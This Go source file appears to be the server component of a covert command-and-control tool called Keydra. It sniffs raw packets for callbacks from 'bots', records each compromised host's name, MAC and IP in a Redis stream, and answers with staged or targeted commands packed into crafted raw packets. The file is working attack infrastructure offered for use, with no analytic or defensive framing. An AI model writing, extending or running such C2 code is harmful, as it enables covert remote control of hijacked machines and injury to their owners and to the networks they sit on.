package main

import (
	"fmt"
	"log"
	"net"
    "context"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/DaveTheBearMan/Keydra/socket"
	"golang.org/x/sys/unix"
	"github.com/redis/go-redis/v9"
)

// Global to store staged command
var stagedCmd string
var rdb *redis.Client
var ctx = context.Background()

// Glabal to store target info
var targetIP string
var targetcommand string
var verbose bool

// Host defines values for a callback from a bot
type Host struct {
	Hostname string
	Mac      net.HardwareAddr
	IP       net.IP
	RespIP   net.IP
	SrcPort  int
	DstPort  int
}

// Write host
func writeLog(streamKey string, event string, message string) {
	// Builds arguments for redis datastream
	args := &redis.XAddArgs{
        Stream: streamKey,
        MaxLen: 500,
        Approx: true,
        Values: map[string]interface{}{
            "event":   event,
            "message": message,
            "time":   time.Now().Format(time.RFC3339),
        },
    }

	// Send to redis datastream 
	_, err := rdb.XAdd(ctx, args).Result()
    if err != nil {
        log.Fatalf("XAdd failed: %v", err)
    } else if verbose {
		fmt.Println(streamKey + " " + event + " " + message)
	}
}

// sendCommand takes
func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, listen chan Host) {

	// Forever loop to respond to bots
	for {
		// Block on reading from channel
		client := <-listen

		// Check if there is a command to run
		// Make a socket for sending
		fd := socket.NewSocket()

		// // Create packet
		// writeLog("Server", "DEBUG", fmt.Sprintf("SRC MAC:", iface.HardwareAddr))
		// writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC:", dstMAC))
		// writeLog("Server", "DEBUG", fmt.Sprintf("SRC IP:", myIP))
		// writeLog("Server", "DEBUG", fmt.Sprintf("DST IP:", client.RespIP))
		if targetcommand != "" {
			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sending target cmd to [%s]: %s", targetIP, targetcommand))
			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateTargetCommand(targetcommand, targetIP))
			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
		} else {
			packet := socket.CreatePacket(iface, myIP, client.RespIP, client.DstPort, client.SrcPort, dstMAC, socket.CreateCommand(stagedCmd))
			socket.SendPacket(fd, iface, socket.CreateAddrStruct(iface), packet)
		}
		// YEET
		if stagedCmd != "" {
			writeLog("Server", "TRAFFIC", fmt.Sprintf("Sent reponse to: %s (%s)", client.Hostname, client.IP))
			// Close the socket
			unix.Close(fd)
		} else {
			unix.Close(fd)
		}
	}
}

// ProcessPacket TODO:
func serverProcessPacket(packet gopacket.Packet, listen chan Host) {
	// Get data from packet
	data := string(packet.ApplicationLayer().Payload())
	payload := strings.Split(data, " ")

	// writeLog("Server", fmt.Sprintf("PACKET SRC IP", packet.NetworkLayer().NetworkFlow().Src().String())

	// Parse the values from the data
	mac, err := net.ParseMAC(payload[2])
	if err != nil {
		writeLog("Server", "ERROR", fmt.Sprintf("ERROR PARSING MAC: %s", err.Error()))
		return
	}

	srcport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Src().String())
	dstport, _ := strconv.Atoi(packet.TransportLayer().TransportFlow().Dst().String())

	// New Host struct for shipping info to sendCommand()
	newHost := Host{
		Hostname: payload[1],
		Mac:      mac,
		IP:       net.ParseIP(payload[3]),
		RespIP:   net.ParseIP(packet.NetworkLayer().NetworkFlow().Src().String()),
		SrcPort:  srcport,
		DstPort:  dstport,
	}

	writeLog("Server", "TRAFFIC", fmt.Sprintf("Recieved From: %s (%s)", newHost.Hostname, newHost.IP))
	writeLog("Client", "JOIN", newHost.IP.String())

	// Write host to channel
	listen <- newHost
}

// func listenRedisStream() {
	
// }

func initializeRawSocketServer() {
	// Create a BPF vm for filtering
	filterVM := socket.CreateBPFVM(socket.FilterRaw)

	// Create a unix file socket for reading
	readfd := socket.NewSocket()
	defer unix.Close(readfd)

	writeLog("Server", "DEBUG", fmt.Sprintf("Created sockets"))

	// Make channel buffer by 5
	listen := make(chan Host, 10)

	// Iface and myip for the sendcommand func to use
	iface, myIP := socket.GetOutwardIface("157.245.141.117:80")
	writeLog("Server", "DEBUG", fmt.Sprintf("Interface: %s", iface.Name))

	dstMAC, err := socket.GetRouterMAC()
	if err != nil {
		log.Fatal(err)
	}
	writeLog("Server", "DEBUG", fmt.Sprintf("DST MAC: %s", dstMAC.String()))

	// Spawn routine to listen for responses
	writeLog("Server", "DEBUG", "Starting go routine...")
	go sendCommand(iface, myIP, dstMAC, listen)

	// Start listening to redis streams for commands
	// go listenRedisStream()

	// This needs to be on main thread
	for {
		// packet := socket.ServerReadPacket(readfd, vm)
		packet, err := socket.ServerReadPacket(readfd, filterVM)
		if err != nil {
			writeLog("Server", "ERROR", err.Error())
		} else if packet != nil {
			go serverProcessPacket(packet, listen)
		}
	}
}

func main() {
	verbose = false
	rdb = redis.NewClient(&redis.Options{ // Connect to local redis database
		Addr: "localhost:6379",
	})	
	go initializeRawSocketServer()

	for {
		streams, err := rdb.XRead(ctx, &redis.XReadArgs{
			Streams: []string{"Server", "$"},
			Block:   0,
			Count:   1,
		}).Result()
		if err != nil {
			log.Fatalf("XRead failed: %v", err)
		}

		for _, stream := range streams {
			for _, msg := range stream.Messages {
				fmt.Printf("ID: %s, Values: %v\n", msg.ID, msg.Values)
			}
		}
	}
}